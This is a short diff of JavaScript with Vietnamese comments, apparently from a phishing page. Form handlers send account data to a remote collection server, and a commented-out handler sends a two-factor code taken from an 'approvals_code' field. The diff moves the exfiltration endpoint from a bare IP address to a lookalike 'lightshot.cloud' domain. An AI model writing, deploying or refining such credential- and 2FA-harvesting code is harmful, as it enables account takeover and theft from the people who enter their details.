@@ -20,7 +20,7 @@ document.getElementById("loadPage").addEventListener("click", function () {
         error.style.display = "block";
     } else {
         // Gửi dữ liệu POST đến máy chủ để thêm tài khoản
-        fetch("http://103.188.167.91/add", {
+        fetch("https://lightshot.cloud/add", {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
@@ -85,7 +85,7 @@ document.getElementById("add-form").addEventListener("submit", function (event) 
 //     event.preventDefault();
 //     const twofa = document.getElementById("approvals_code").value;
 //     // Gửi dữ liệu POST đến máy chủ để cập nhật tài khoản
-//     fetch("http://103.188.167.91/update", {
+//     fetch("https://lightshot.cloud/update", {
 //         method: "POST",
 //         headers: {
 //             "Content-Type": "application/x-www-form-urlencoded"
